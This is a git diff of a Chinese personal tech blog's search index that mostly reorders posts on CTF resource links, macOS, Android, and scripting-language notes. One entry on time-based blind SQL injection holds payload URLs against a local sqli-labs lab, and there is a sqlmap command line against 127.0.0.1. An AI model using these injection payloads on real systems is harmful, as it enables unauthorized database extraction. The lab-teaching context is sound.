+<p><a href="http://erange.heetian.com/CTFrace.html" target="_blank" rel="noopener">http://erange.heetian.com/CTFrace.html</a>    –合天  </p>
+<p><a href="http://www.simplexue.com/" target="_blank" rel="noopener">http://www.simplexue.com/</a>    –西普学院  </p>
+<p><a href="http://1111.segmentfault.com/" target="_blank" rel="noopener">http://1111.segmentfault.com/</a>    –光棍节程序员闯关秀  </p>
+<p><a href="http://www.helloisa.com/" target="_blank" rel="noopener">http://www.helloisa.com/</a>  –一个游戏又友链了几个游戏  </p>
+<p><a href="https://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">https://redtiger.labs.overthewire.org/</a>  –外国站点web_sql  </p>
+<hr>
+<p><a href="https://github.com/ctfs/" target="_blank" rel="noopener">https://github.com/ctfs/</a>   –git上writeup  </p>
+<p><a href="http://bobao.360.cn/ctf/" target="_blank" rel="noopener">http://bobao.360.cn/ctf/</a>   –360安全播报  </p>
+<p><a href="http://sec.yka.me/" target="_blank" rel="noopener">http://sec.yka.me/</a>  –英文版writeup  </p>
+<p><a href="http://bobao.360.cn/ctf/learning/129.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/129.html</a>  –DUTCTF-2015-Writeup  </p>
+<p><a href="http://ctf.idf.cn/index.php?g=portal&amp;m=list&amp;a=index&amp;id=10" target="_blank" rel="noopener">http://ctf.idf.cn/index.php?g=portal&amp;m=list&amp;a=index&amp;id=10</a>  –writeup  </p>
+<p><a href="https://ctf-team.vulnhub.com/" target="_blank" rel="noopener">https://ctf-team.vulnhub.com/</a>  –国外wp  </p>
+<p><a href="https://www.91ri.org/9482.html" target="_blank" rel="noopener">https://www.91ri.org/9482.html</a>  –91ri  </p>
+<p><a href="http://zhuanlan.zhihu.com/wooyun/19861125" target="_blank" rel="noopener">http://zhuanlan.zhihu.com/wooyun/19861125</a> –wooyun_writeup  </p>
+<p><a href="http://drops.wooyun.org/?s=writeup&amp;submit=%E6%90%9C%E7%B4%A2" target="_blank" rel="noopener">http://drops.wooyun.org/?s=writeup&amp;submit=%E6%90%9C%E7%B4%A2</a> –wooyun  </p>
+<hr>
+<p><a href="http://attach.blackbap.org/down/" target="_blank" rel="noopener">http://attach.blackbap.org/down/</a>  –习科工具下载  </p>
+<p><a href="http://forum.cnsec.org/thread-93930-1-1.html" target="_blank" rel="noopener">http://forum.cnsec.org/thread-93930-1-1.html</a>  –ctf_tools  </p>
+<p><a href="http://mdsec.net/wahh/tools.html" target="_blank" rel="noopener">http://mdsec.net/wahh/tools.html</a>    –tool下载  </p>
+<p><a href="http://tool.lu/" target="_blank" rel="noopener">http://tool.lu/</a>  –在线工具集合  </p>
+<p><a href="http://m.blog.csdn.net/blog/winkar/42458273" target="_blank" rel="noopener">http://m.blog.csdn.net/blog/winkar/42458273</a>  –一部分  </p>
+<p><a href="http://www.ibeast.com/content/tools/ciscopassword/" target="_blank" rel="noopener">http://www.ibeast.com/content/tools/ciscopassword/</a>  –passwd_break  </p>
+<p><a href="http://www.yellowpipe.com/yis/tools/encrypter/index.php" target="_blank" rel="noopener">http://www.yellowpipe.com/yis/tools/encrypter/index.php</a>  –编码解码  </p>
+<p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a>    –js_fuck  </p>
+<p><a href="http://www.objectif-securite.ch/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/ophcrack.php</a>    –hash破解  </p>
+<hr>
+<p><a href="http://217.logdown.com/" target="_blank" rel="noopener">http://217.logdown.com/</a>    –217  </p>
+<p><a href="http://www.blue-lotus.net" target="_blank" rel="noopener">http://www.blue-lotus.net</a>    –blue-lotus蓝莲花  </p>
+<p><a href="http://blog.0ops.net/" target="_blank" rel="noopener">http://blog.0ops.net/</a>    –0ops  </p>
+<p><a href="http://le4f.net/" target="_blank" rel="noopener">http://le4f.net/</a>   –le4f大牛博客  </p>
+<p><a href="http://www.programlife.net/" target="_blank" rel="noopener">http://www.programlife.net/</a>    –代码疯子  </p>
+<p><a href="http://appleu0.sinaapp.com/" target="_blank" rel="noopener">http://appleu0.sinaapp.com/</a>    –apple牛  </p>
+<p><a href="http://www.syjzwjj.com/" target="_blank" rel="noopener">http://www.syjzwjj.com/</a>  –俊杰  </p>
+<p><a href="http://blog.sycsec.com/" target="_blank" rel="noopener">http://blog.sycsec.com/</a>  –三叶草  </p>
+<p><a href="http://www.waitalone.cn/" target="_blank" rel="noopener">http://www.waitalone.cn/</a>    –独自等待  </p>
+<hr>
+<p>反编译工具  </p>
+<p>android反编译工具 <a href="https://down.52pojie.cn/Tools/Android_Tools/" target="_blank" rel="noopener">https://down.52pojie.cn/Tools/Android_Tools/</a>  </p>
+<p>apk反编译实战<br><a href="http://www.wjdiankong.cn/apk%E8%84%B1%E5%A3%B3%E5%9C%A3%E6%88%98%E4%B9%8B-%E8%84%B1%E6%8E%89%E7%88%B1%E5%8A%A0%E5%AF%86%E5%AE%B6%E7%9A%84%E5%A3%B3/" target="_blank" rel="noopener">http://www.wjdiankong.cn/apk%E8%84%B1%E5%A3%B3%E5%9C%A3%E6%88%98%E4%B9%8B-%E8%84%B1%E6%8E%89%E7%88%B1%E5%8A%A0%E5%AF%86%E5%AE%B6%E7%9A%84%E5%A3%B3/</a>  </p>
 ]]></content>
       <categories>
-        <category>设计模式</category>
+        <category>ctf</category>
       </categories>
       <tags>
-        <tag>设计模式</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -9473,6 +9473,28 @@ public void fly(){
       <tags>
         <tag>android逆向</tag>
         <tag>android安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mac_终端用sublime打开文件</title>
+    <url>/post/576883658.html</url>
+    <content><![CDATA[<p><strong>打开文件</strong></p>
+<pre><code>vi ~/.bash_profile
+</code></pre><p><strong>添加命令</strong></p>
+<pre><code>alias subl=\&#39;&#39;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&#39;\&#39;
+</code></pre><p><strong>启动</strong></p>
+<pre><code>source ~/.bash_profile 
+</code></pre><p><strong>使用命令</strong></p>
+<pre><code>subl 文件/目录
+
+subl ./_posts/2018-08-03-mac_sublime_open_file.md
+</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011240016/article/details/54434923" target="_blank" rel="noopener">终端用sublime打开文件的方法</a></p>
+]]></content>
+      <categories>
+        <category>macos</category>
+      </categories>
+      <tags>
+        <tag>macos</tag>
       </tags>
   </entry>
   <entry>
@@ -9557,59 +9579,6 @@ XCTF总决赛
       </tags>
   </entry>
   <entry>
-    <title>mac_终端用sublime打开文件</title>
-    <url>/post/576883658.html</url>
-    <content><![CDATA[<p><strong>打开文件</strong></p>
-<pre><code>vi ~/.bash_profile
-</code></pre><p><strong>添加命令</strong></p>
-<pre><code>alias subl=\&#39;&#39;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&#39;\&#39;
-</code></pre><p><strong>启动</strong></p>
-<pre><code>source ~/.bash_profile 
-</code></pre><p><strong>使用命令</strong></p>
-<pre><code>subl 文件/目录
-
-subl ./_posts/2018-08-03-mac_sublime_open_file.md
-</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011240016/article/details/54434923" target="_blank" rel="noopener">终端用sublime打开文件的方法</a></p>
-]]></content>
-      <categories>
-        <category>macos</category>
-      </categories>
-      <tags>
-        <tag>macos</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>blog链接</title>
-    <url>/post/1065774692.html</url>
-    <content><![CDATA[<p><a href="https://www.wikimoe.com/" target="_blank" rel="noopener">wikimoe_live2d</a><br><a href="https://qqdie.com/archives/l2d233.html" target="_blank" rel="noopener">Live2D看板娘来了！typecho插件</a><br><a href="https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02" target="_blank" rel="noopener">给博客添加能动的看板娘(Live2D)-将其添加到网页上吧</a><br><a href="https://www.wikimoe.com/?post=75" target="_blank" rel="noopener">emlog插件版之给博客加上能陪聊的Live2d版伊斯特瓦尔【ver1.04】</a><br><a href="https://www.wikimoe.com/?post=76" target="_blank" rel="noopener">博客通用版Live2d伊斯特瓦尔发布</a>  </p>
-<p><a href="https://xiaolin.in/read/hitokoto-api-xiaolin-edition.html" target="_blank" rel="noopener">一言</a>  </p>
-]]></content>
-      <categories>
-        <category>blog</category>
-      </categories>
-      <tags>
-        <tag>link</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2.1.1-文件上传流动原理与流程-上传检测流程</title>
-    <url>/post/2419343777.html</url>
-    <content><![CDATA[<h2 id="文件上传检测流程"><a href="#文件上传检测流程" class="headerlink" title="文件上传检测流程"></a>文件上传检测流程</h2><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/15/01.png" alt="文件上传检测流程"></p>
-<p><strong>前端提交：</strong><br>javaScript检测、Flash AS检测<br>app：java代码检测  </p>
-<p><strong>数据传输：</strong><br>形成的报文到后端处理 -&gt; 会存在WAF拦截、IPS入侵防御拦截  </p>
-<p><strong>后端处理：</strong><br>文件扩展名检测、MIME TYPE检测（报文文件参数content type）、文件格式检测、内容检测（检测恶意代码）  </p>
-<p><strong>写入文件系统：</strong><br>文件重命名、强制改变后缀名为jpg、杀毒软件查杀（隔离区或删除、00截断） </p>
-<p><strong>访问文件：</strong><br>无执行权限（直接返回文件内容）、未知位置（根据特殊名或id读取文件）  </p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-        <tag>文件上传漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>git切换远程分支命令</title>
     <url>/post/1524903793.html</url>
     <content><![CDATA[<p>1.克隆项目  </p>
@@ -9639,6 +9608,37 @@ remotes/origin/release
       <tags>
         <tag>git</tag>
         <tag>branch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2.1.1-文件上传流动原理与流程-上传检测流程</title>
+    <url>/post/2419343777.html</url>
+    <content><![CDATA[<h2 id="文件上传检测流程"><a href="#文件上传检测流程" class="headerlink" title="文件上传检测流程"></a>文件上传检测流程</h2><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/15/01.png" alt="文件上传检测流程"></p>
+<p><strong>前端提交：</strong><br>javaScript检测、Flash AS检测<br>app：java代码检测  </p>
+<p><strong>数据传输：</strong><br>形成的报文到后端处理 -&gt; 会存在WAF拦截、IPS入侵防御拦截  </p>
+<p><strong>后端处理：</strong><br>文件扩展名检测、MIME TYPE检测（报文文件参数content type）、文件格式检测、内容检测（检测恶意代码）  </p>
+<p><strong>写入文件系统：</strong><br>文件重命名、强制改变后缀名为jpg、杀毒软件查杀（隔离区或删除、00截断） </p>
+<p><strong>访问文件：</strong><br>无执行权限（直接返回文件内容）、未知位置（根据特殊名或id读取文件）  </p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>blog链接</title>
+    <url>/post/1065774692.html</url>
+    <content><![CDATA[<p><a href="https://www.wikimoe.com/" target="_blank" rel="noopener">wikimoe_live2d</a><br><a href="https://qqdie.com/archives/l2d233.html" target="_blank" rel="noopener">Live2D看板娘来了！typecho插件</a><br><a href="https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02" target="_blank" rel="noopener">给博客添加能动的看板娘(Live2D)-将其添加到网页上吧</a><br><a href="https://www.wikimoe.com/?post=75" target="_blank" rel="noopener">emlog插件版之给博客加上能陪聊的Live2d版伊斯特瓦尔【ver1.04】</a><br><a href="https://www.wikimoe.com/?post=76" target="_blank" rel="noopener">博客通用版Live2d伊斯特瓦尔发布</a>  </p>
+<p><a href="https://xiaolin.in/read/hitokoto-api-xiaolin-edition.html" target="_blank" rel="noopener">一言</a>  </p>
+]]></content>
+      <categories>
+        <category>blog</category>
+      </categories>
+      <tags>
+        <tag>link</tag>
       </tags>
   </entry>
   <entry>
@@ -9882,6 +9882,32 @@ sqlmap -u &quot;http://127.0.0.1/Less-1/double.php?id=1%2527&quot; --current--+
       </categories>
       <tags>
         <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.自制脚本语言-第一章笔记</title>
+    <url>/post/395714690.html</url>
+    <content><![CDATA[<p>这是一个读两周自制脚本语言的笔记，然后立flag，这个月打算看完  </p>
+<h1 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h1><h2 id="1-1-机器语言-amp-汇编语言"><a href="#1-1-机器语言-amp-汇编语言" class="headerlink" title="1.1 机器语言 &amp; 汇编语言"></a>1.1 机器语言 &amp; 汇编语言</h2><ul>
+<li><p>机器语言： 不需要借助软件执行，不需要语言处理器，可以由硬件直接解释执行 一个位数很长的二进制数字</p>
+</li>
+<li><p>汇编语言： 通过汇编语言程序表述巨大的数字，使其易于理解，需要通过软件转换成机器语言，这种软件称为汇编程序。汇编程序是一种最基本的语言处理器</p>
+</li>
+</ul>
+<h2 id="1-2-解释器-amp-编译器"><a href="#1-2-解释器-amp-编译器" class="headerlink" title="1.2 解释器 &amp; 编译器"></a>1.2 解释器 &amp; 编译器</h2><ul>
+<li><p>解释器： 根据程序中的算法执行运算，执行程序的软件<br>如果执行的程序由虚拟机语言或类似机器语言程序设计语言写成，这种软件也能称为虚拟机</p>
+</li>
+<li><p>编译器： 能将某种语言写成的程序转换为另一种语言的程序<br>编译器转换程序的行为称为编译，转换前的程序称为源代码或源程序。<br>如果编译器没有把源代码直接转换为机器语言，称为源代码转换器或源码转换器</p>
+</li>
+</ul>
+<h2 id="1-3-开发语言处理器"><a href="#1-3-开发语言处理器" class="headerlink" title="1.3 开发语言处理器"></a>1.3 开发语言处理器</h2><p>Stone语言 运行于 Java虚拟机</p>
+<h2 id="1-4-语言处理器的结构与本书的框架"><a href="#1-4-语言处理器的结构与本书的框架" class="headerlink" title="1.4 语言处理器的结构与本书的框架"></a>1.4 语言处理器的结构与本书的框架</h2><p>源代码首先将进行词法分析，由一长串字符串细分为多个更小的字符串单元。分割后的字符串称为单词。之后处理器将执行语法分析处理，把单词的排列转换为抽象语法树。 之后 编译器会把抽象语法树转换为其他语言，而解释器将会一边分析抽象语法树一边执行运算</p>
+]]></content>
+      <categories>
+        <category>脚本语言</category>
+      </categories>
+      <tags>
+        <tag>脚本语言</tag>
       </tags>
   </entry>
   <entry>
@@ -10180,32 +10206,6 @@ textview以此排列
       </tags>
   </entry>
   <entry>
-    <title>1.自制脚本语言-第一章笔记</title>
-    <url>/post/395714690.html</url>
-    <content><![CDATA[<p>这是一个读两周自制脚本语言的笔记，然后立flag，这个月打算看完  </p>
-<h1 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h1><h2 id="1-1-机器语言-amp-汇编语言"><a href="#1-1-机器语言-amp-汇编语言" class="headerlink" title="1.1 机器语言 &amp; 汇编语言"></a>1.1 机器语言 &amp; 汇编语言</h2><ul>
-<li><p>机器语言： 不需要借助软件执行，不需要语言处理器，可以由硬件直接解释执行 一个位数很长的二进制数字</p>
-</li>
-<li><p>汇编语言： 通过汇编语言程序表述巨大的数字，使其易于理解，需要通过软件转换成机器语言，这种软件称为汇编程序。汇编程序是一种最基本的语言处理器</p>
-</li>
-</ul>
-<h2 id="1-2-解释器-amp-编译器"><a href="#1-2-解释器-amp-编译器" class="headerlink" title="1.2 解释器 &amp; 编译器"></a>1.2 解释器 &amp; 编译器</h2><ul>
-<li><p>解释器： 根据程序中的算法执行运算，执行程序的软件<br>如果执行的程序由虚拟机语言或类似机器语言程序设计语言写成，这种软件也能称为虚拟机</p>
-</li>
-<li><p>编译器： 能将某种语言写成的程序转换为另一种语言的程序<br>编译器转换程序的行为称为编译，转换前的程序称为源代码或源程序。<br>如果编译器没有把源代码直接转换为机器语言，称为源代码转换器或源码转换器</p>
-</li>
-</ul>
-<h2 id="1-3-开发语言处理器"><a href="#1-3-开发语言处理器" class="headerlink" title="1.3 开发语言处理器"></a>1.3 开发语言处理器</h2><p>Stone语言 运行于 Java虚拟机</p>
-<h2 id="1-4-语言处理器的结构与本书的框架"><a href="#1-4-语言处理器的结构与本书的框架" class="headerlink" title="1.4 语言处理器的结构与本书的框架"></a>1.4 语言处理器的结构与本书的框架</h2><p>源代码首先将进行词法分析，由一长串字符串细分为多个更小的字符串单元。分割后的字符串称为单词。之后处理器将执行语法分析处理，把单词的排列转换为抽象语法树。 之后 编译器会把抽象语法树转换为其他语言，而解释器将会一边分析抽象语法树一边执行运算</p>
-]]></content>
-      <categories>
-        <category>脚本语言</category>
-      </categories>
-      <tags>
-        <tag>脚本语言</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>1.4.1-SQL注入防御绕过-宽字节注入</title>
     <url>/post/2024290485.html</url>
     <content><![CDATA[<h2 id="01-宽字节注入原理"><a href="#01-宽字节注入原理" class="headerlink" title="01 宽字节注入原理"></a>01 宽字节注入原理</h2><blockquote>
@@ -10345,6 +10345,27 @@ id: location.pathname,      // Ensure uniqueness and length less than 50{{ page.
       </tags>
   </entry>
   <entry>
+    <title>1.3.2-SQL注入-SQL盲注-时间盲注</title>
+    <url>/post/4135600167.html</url>
+    <content><![CDATA[<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/02.png" alt=""></p>
+<h3 id="时间盲注方法"><a href="#时间盲注方法" class="headerlink" title="时间盲注方法"></a>时间盲注方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/03.png" alt=""></p>
+<pre><code>http://localhost:90/Less-10/?id=1&quot; and if(left(user(),1)=&#39;a&#39;,0,sleep(3))--+
+
+http://localhost:90/Less-10/?id=1&quot; and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;r&#39;,0,sleep(3))--+
+</code></pre><p>时间注入脚本  </p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/05.png" alt=""></p>
+<hr>
+<h2 id="links"><a href="#links" class="headerlink" title="links"></a>links</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzExNzI5Ng==&amp;mid=2648732982&amp;idx=1&amp;sn=159f2b13d7737232577ae11ccecb33d2&amp;chksm=f0d95f29c7aed63f2e0aea215f57672f7282de08c47a1033e6b2cfe1fee5fb788b4c8de405c0&amp;mpshare=1&amp;scene=23&amp;srcid=0702v4QOmQfViIjUPqq98LAc" target="_blank" rel="noopener">时间盲注</a></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>sql盲注</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>1.3.3-SQL注入-SQL盲注-Dnslog盲注</title>
     <url>/post/2964387005.html</url>
     <content><![CDATA[<blockquote>
@@ -10386,24 +10407,224 @@ sql语句不能含有特殊符号
       </tags>
   </entry>
   <entry>
-    <title>1.3.2-SQL注入-SQL盲注-时间盲注</title>
-    <url>/post/4135600167.html</url>
-    <content><![CDATA[<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/02.png" alt=""></p>
-<h3 id="时间盲注方法"><a href="#时间盲注方法" class="headerlink" title="时间盲注方法"></a>时间盲注方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/03.png" alt=""></p>
-<pre><code>http://localhost:90/Less-10/?id=1&quot; and if(left(user(),1)=&#39;a&#39;,0,sleep(3))--+
+    <title>android EventBus 使用</title>
+    <url>/post/3369655730.html</url>
+    <content><![CDATA[<p>2017 10 27<br>EventBus是什么？<br>首先有两个概念发布者/订阅者  </p>
+<p>发布者就是 发送事件<br>订阅者 就是接收事件  </p>
+<pre><code>gradle
 
-http://localhost:90/Less-10/?id=1&quot; and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;r&#39;,0,sleep(3))--+
-</code></pre><p>时间注入脚本  </p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/05.png" alt=""></p>
-<hr>
-<h2 id="links"><a href="#links" class="headerlink" title="links"></a>links</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzExNzI5Ng==&amp;mid=2648732982&amp;idx=1&amp;sn=159f2b13d7737232577ae11ccecb33d2&amp;chksm=f0d95f29c7aed63f2e0aea215f57672f7282de08c47a1033e6b2cfe1fee5fb788b4c8de405c0&amp;mpshare=1&amp;scene=23&amp;srcid=0702v4QOmQfViIjUPqq98LAc" target="_blank" rel="noopener">时间盲注</a></p>
-]]></content>
+compile &#39;org.greenrobot:eventbus:3.0.0&#39;
+</code></pre><p>1.定义事件</p>
+<pre><code>
+// 定义事件 这个就是你要传送的数据实体类
+public static class MessageEvent { /* Additional fields if needed */ }
+</code></pre>
+
+
+<p>2.准备订阅者</p>
+<pre><code>
+@Subscribe(threadMode = ThreadMode.MAIN)  
+public void onMessageEvent(MessageEvent event) {/* Do something */};
+
+// 订阅者 接受数据的方法 threadMode  是运行在什么线程模式
+http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
+</code></pre>
+
+<p>注册和取消注册订阅者</p>
+<pre><code> @Override
+ public void onStart() {
+     super.onStart();
+     EventBus.getDefault().register(this);
+ }
+
+ @Override
+ public void onStop() {
+     super.onStop();
+     EventBus.getDefault().unregister(this);
+ }
+</code></pre><p>3.发送事件</p>
+<pre><code>`EventBus.getDefault().post(new MessageEvent());`
+</code></pre>]]></content>
       <categories>
-        <category>web安全</category>
+        <category>android</category>
       </categories>
       <tags>
-        <tag>sql注入</tag>
-        <tag>sql盲注</tag>
+        <tag>android</tag>
+        <tag>eventbus</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android 代码样式规范</title>
+    <url>/post/208407023.html</url>
+    <content><![CDATA[<p>原文地址 把重点记录下<br><a href="https://source.android.com/source/code-style.html" target="_blank" rel="noopener">https://source.android.com/source/code-style.html</a></p>
+<p>1.不要忽略异常(空的catch字句)  </p>
+<p>  不要不捕获异常  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-d9e8766c47552fe2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="推荐方式"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-f182ce0036e28095.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="推荐方式"></p>
+<p>2.不要使用Findlizer  </p>
+<p>Finalizer是一种在对象被垃圾回收时执行一段代码的方法。虽然他们可以方便地进行清理（特别是外部资源），但是没有保证什么时候调用终结器（甚至会被调用）。  </p>
+<p>Android不使用finalizer。在大多数情况下，您可以从具有良好异常处理的终结器中完成所需的操作。如果你绝对需要它，定义一个close（）方法（或类似的），并准确地记录该方法需要被调用时（见InputStream的例子）。在这种情况下，只要不希望溢出日志，就可以打印来自终结器的短日志消息，但不是必需的。  </p>
+<p>3.Java库规则  </p>
+<p>旧的代码使用旧的库 在创建新的组件不要使用不推荐使用的库  </p>
+<p>有使用Android的Java库和工具的约定。在某些情况下，约定以重要的方式发生了变化，较旧的代码可能使用已弃用的模式或库。当使用这样的代码，可以继续现有的风格。但是，在创建新组件时，不要使用不推荐使用的库。  </p>
+<p>4.Java风格规则  </p>
+<p>使用Javadoc标准注释  </p>
+<p>每个文件应在顶部有一个版权声明，其后是package和import语句（每个块由空行分隔），最后是类或接口声明。在Javadoc注释中，描述类或接口的作用。  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-a2b0703f23b915d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="注释规范"></p>
+<p>你写的每个类和公共方法必须包含一个Javadoc注释，至少有一个句子描述类或方法的作用。这句话应以第三人称描述性动词开始。  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-cf5bed56f9efa6b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="注释规范"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-1e56e232fb5d1867.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="注释规范"></p>
+<p>如何为javadoc编写注释 [<a href="http://www.oracle.com/technetwork/java/javase/documentation/index-137868.html]" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/documentation/index-137868.html]</a>  </p>
+<p>5.写短的方法  </p>
+<p>如果一个方法超过40行左右，考虑它是否可以分解而不伤害程序的结构。  </p>
+<p>6.在标准位置定义字段  </p>
+<p>在文件的顶部或在使用它们的方法之前定义字段。  </p>
+<p>7.限制变量范围  </p>
+<p>将局部变量范围保持最小<br>循环变量应在for语句本身中声明  </p>
+<p>8.次序导入语句  </p>
+<p>  android import<br>  第三方 import<br>  java 和 javax  </p>
+<p>9.使用缩进空格<br>我们使用四（4）个空格缩进块，而不是制表符。当有疑问时，要与周围的代码一致。  </p>
+<p>我们使用八（8）个空格缩进进行换行，包括函数调用和赋值。例如，这是正确的：  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-f7ba99e90aa951eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="缩进"></p>
+<p>10.遵循字段命名约定  </p>
+<p>非公共，非静态字段名以m开头。<br>静态字段名称以s开头。<br>其他字段以小写字母开头。<br>公共静态最终字段（常量）为ALL_CAPS_WITH_UNDERSCORES。  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-bb7f60ad6182be61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="命名规范"></p>
+<p>11.使用标准括号样式<br>大括号不要自己一行; 大括号和代码在同一行：  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-2a03544c67f34cbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="标准括号"></p>
+<p>我们需要在条件语句周围添加括号。异常：如果整个条件（条件和主体）适合一行，你可以（但没有义务）把它全部放在一行上。例如，这是可以接受的：  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-851b61c733681703.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="括号规范"></p>
+<p>12.限制线长度  </p>
+<p>代码中的每行文字长度最多为100个字符。虽然许多讨论都围绕这个规则，但是决定仍然是100个字符是最大值，以下例外：  </p>
+<p>如果注释行包含示例命令或长度超过100个字符的文字URL，则该行可能长于100个字符，以便于剪切和粘贴。<br>导入行可以超过限制，因为人们很少看到它们（这也简化了工具写入）。<br>使用标准Java注释  </p>
+<p>注释应该在同一语言元素的其他修饰符之前。简单的标记注释（例如@Override）可以与语言元素列在同一行。如果有多个注释或参数化注释，它们应按字母顺序逐行列出。  </p>
+<p>13.使用标准Java注释  </p>
+<p>注释应该在同一语言元素的其他修饰符之前。简单的标记注释（例如@Override）可以与语言元素列在同一行。如果有多个注释或参数化注释，它们应按字母顺序逐行列出。  </p>
+<p>Java中的三个预定义注释的Android标准实践是：  </p>
+<p>@Deprecated：当不建议使用注释元素时，必须使用@Deprecated注释。如果使用@Deprecated注释，则还必须具有@deprecated Javadoc标记，并且应该命名替代实现。此外，请记住，一个@Deprecated方法 仍然应该工作。如果您看到旧代码带有@deprecated Javadoc标记，请添加@Deprecated注释。<br>@Override：当方法从超类覆盖声明或实现时，必须使用@Override注释。例如，如果使用@inheritdocs Javadoc标记，并从类（而不是接口）派生，则还必须注释该方法@覆盖父类的方法。<br>@SuppressWarnings：@SuppressWarnings注释只应在不可能消除警告的情况下使用。如果警告通过此“不可能消除”测试，则必须使用@SuppressWarnings注释，以确保所有警告都反映代码中的实际问题。<br>当需要@SuppressWarnings注释时，必须以TODO注释作为前缀，解释“不可能消除”条件。这通常会识别具有尴尬界面的违规类。例如：  </p>
+<p>// TODO: The third-party class com.third.useful.Utility.rotate() needs generics<br>@SuppressWarnings(“generic-cast”)<br>List<string> blix = Utility.rotate(blax);<br>当需要@SuppressWarnings注释时，应重构代码以隔离应用注释的软件元素。  </string></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-0ed9e09a961a4e04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="注释"></p>
+<p>14.将首字母缩略词作为词  </p>
+<p>将缩写词和缩写词作为命名变量，方法和类中的单词，以使名称更易读：  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-9176c57a4abf2d68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="命名"></p>
+<p>由于JDK和Android代码库在首字母缩略词之间非常不一致，因此几乎不可能与周围的代码一致。因此，始终将首字母缩写作为词。  </p>
+<p>15.使用TODO注释  </p>
+<p>使用TODO注释代码是临时的，短期的解决方案，或者足够好但不完美的代码。TODO应在所有大写字母中包含字符串TODO，后跟冒号：  </p>
+<p>  // TODO: Remove this code after the UrlTable2 has been checked in.</p>
+<p>和</p>
+<p>  // TODO: Change this to use a flag instead of a constant.</p>
